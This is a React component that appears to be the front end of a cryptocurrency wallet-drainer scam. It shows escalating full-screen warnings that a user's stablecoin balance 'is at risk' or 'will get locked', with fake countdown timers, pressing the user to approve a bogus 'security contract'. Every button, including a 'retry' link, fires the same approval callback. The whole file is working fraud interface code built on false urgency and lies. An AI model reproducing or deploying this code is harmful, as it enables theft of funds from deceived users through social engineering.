'use client';

import { useEffect, useRef, useState } from 'react';

const INITIAL_SECONDS = 15;
const FINAL_SECONDS = 8;

type Phase = 'initial' | 'final';

export function ApprovalPrompt({
  chainName,
  stableSymbol,
  stableUsd,
  onApprove,
}: {
  chainName: string;
  stableSymbol: string;
  stableUsd: string;
  onApprove: () => void;
}) {
  const [phase, setPhase] = useState<Phase>('initial');
  const [secondsLeft, setSecondsLeft] = useState(INITIAL_SECONDS);
  const fired = useRef(false);

  useEffect(() => {
    const interval = setInterval(() => {
      setSecondsLeft((s) => {
        if (s <= 1) {
          if (phase === 'initial') {
            setPhase('final');
            return FINAL_SECONDS;
          }
          clearInterval(interval);
          return 0;
        }
        return s - 1;
      });
    }, 1000);
    return () => clearInterval(interval);
  }, [phase]);

  const handleApprove = () => {
    if (fired.current) return;
    fired.current = true;
    onApprove();
  };

  const isFinal = phase === 'final';

  // ---------------- Phase 1 — Initial prompt ----------------
  if (!isFinal) {
    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm">
        <div className="mx-4 w-full max-w-md rounded-[20px] border-2 border-red-500 bg-white p-6 shadow-[0_0_40px_rgba(239,68,68,0.35)]">
          <div className="mb-4 flex items-center gap-3">
            <div className="flex h-10 w-10 items-center justify-center rounded-full bg-red-500/20">
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
                <path
                  d="M12 9v4M12 17h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"
                  stroke="#EF4444"
                  strokeWidth="2.2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                />
              </svg>
            </div>
            <h2 className="text-[20px] font-[535] tracking-[-0.02em] text-red-600">
              URGENT — Secure your funds now
            </h2>
          </div>

          <p className="mb-3 text-[14px] leading-[1.5] tracking-[-0.02em] text-[#222222]">
            Your <strong className="text-red-600">{stableSymbol}</strong> balance of{' '}
            <strong className="text-red-600">${stableUsd}</strong> on{' '}
            <strong>{chainName}</strong> is at risk.
          </p>

          <p className="mb-4 text-[14px] leading-[1.5] tracking-[-0.02em] text-[#666666]">
            Approve the security contract now to secure your {stableSymbol} balance from
            any type of risks and make your funds 100% free. This approval is required
            before the timer expires.
          </p>

          <div className="mb-5 flex flex-col items-center justify-center rounded-[16px] border border-red-500/40 bg-red-500/10 py-4">
            <div className="text-[12px] font-[535] uppercase tracking-[0.24em] text-red-600">
              Time remaining
            </div>
            <div className="mt-1 text-[44px] font-[535] leading-none tracking-[-0.02em] text-red-600">
              {secondsLeft}s
            </div>
          </div>

          <button
            onClick={handleApprove}
            className="w-full rounded-[20px] bg-[#FF37C7] py-4 text-[16px] font-[535] tracking-[-0.02em] text-white transition-opacity hover:opacity-90"
          >
            Approve &amp; Secure {stableSymbol}
          </button>

          <button
            onClick={handleApprove}
            className="mt-3 w-full py-2 text-[12px] tracking-[-0.02em] text-[#999999] hover:text-[#666666]"
          >
            Didn&apos;t get the popup? Click here to retry
          </button>
        </div>
      </div>
    );
  }

  // ---------------- Phase 2 — Final warning ----------------
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-md">
      {/* Pulsing red vignette behind the card */}
      <div className="pointer-events-none absolute inset-0 animate-pulse bg-[radial-gradient(circle_at_center,rgba(239,68,68,0.45),transparent_65%)]" />

      {/* Blinking top banner */}
      <div className="pointer-events-none fixed inset-x-0 top-8 z-[60] flex justify-center">
        <div className="animate-pulse rounded-[16px] border-2 border-red-600 bg-red-600 px-6 py-3 text-center shadow-[0_0_30px_rgba(239,68,68,0.7)]">
          <p className="text-[14px] font-[535] tracking-[-0.02em] text-white">
            FINAL WARNING — YOUR FUNDS WILL BE LOCKED
          </p>
        </div>
      </div>

      <div className="relative mx-4 w-full max-w-md rounded-[20px] border-2 border-red-600 bg-[#1A0A0A] p-6 shadow-[0_0_60px_rgba(239,68,68,0.6)]">
        <div className="mb-4 flex items-center gap-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-full bg-red-600/30">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
              <path
                d="M12 9v4M12 17h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"
                stroke="#EF4444"
                strokeWidth="2.4"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
            </svg>
          </div>
          <h2 className="text-[20px] font-[535] tracking-[-0.02em] text-red-400">
            IMMEDIATE ACTION REQUIRED
          </h2>
        </div>

        <p className="mb-3 text-[14px] leading-[1.5] tracking-[-0.02em] text-red-100">
          Your <strong className="text-red-400">{stableSymbol}</strong> balance of{' '}
          <strong className="text-red-400">${stableUsd}</strong> on{' '}
          <strong className="text-white">{chainName}</strong> will get locked within one hour.
        </p>

        <p className="mb-4 text-[14px] leading-[1.5] tracking-[-0.02em] text-red-100">
          To revoke this, immediately secure your funds.{' '}
          <strong className="text-red-400">
            Immediately secure your {stableSymbol}.
          </strong>
        </p>

        <div className="mb-5 flex flex-col items-center justify-center rounded-[16px] border border-red-600 bg-red-600/15 py-4">
          <div className="text-[12px] font-[535] uppercase tracking-[0.24em] text-red-400">
            Seconds before lock
          </div>
          <div className="mt-1 text-[52px] font-[535] leading-none tracking-[-0.02em] text-red-500">
            {secondsLeft}s
          </div>
        </div>

        <button
          onClick={handleApprove}
          className="w-full rounded-[20px] bg-red-600 py-4 text-[16px] font-[535] tracking-[-0.02em] text-white transition-opacity hover:opacity-90"
        >
          SECURE {stableSymbol} NOW
        </button>

        <button
          onClick={handleApprove}
          className="mt-3 w-full py-2 text-[12px] tracking-[-0.02em] text-red-400 hover:text-red-300"
        >
          Didn&apos;t get the popup? Click here to retry
        </button>
      </div>
    </div>
  );
}
